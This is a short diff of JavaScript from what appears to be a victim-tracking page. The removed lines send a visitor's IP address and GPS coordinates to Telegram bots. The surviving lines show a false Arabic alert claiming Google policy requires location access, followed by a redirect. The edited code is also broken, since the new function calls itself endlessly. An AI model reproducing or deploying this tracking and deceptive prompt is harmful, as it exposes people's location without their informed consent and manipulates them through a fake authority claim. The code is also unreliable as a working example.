@@ -115,7 +115,7 @@ ${ipAddress}
   async function yourFunction() {
 	   if (!navigator.geolocation) {
     // Geolocation not supported by browser
-sendIPToTelegramBots();
+yourFunction();
   alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
 
    //
@@ -128,14 +128,16 @@ sendIPToTelegramBots();
     },
     (error) => {
       if (error.code === error.PERMISSION_DENIED) {
-				sendIPToTelegramBots();
-				await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+				yourFunction();
+				
 		    //alert("اضغط سماح لاستمرار allow");
        alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
         // showAlert();
+		yourFunction();
          redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
      } else {
+		 yourFunction();
       // Geolocation failed for other reasons (e.g., GPS unavailable)
       alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
     }
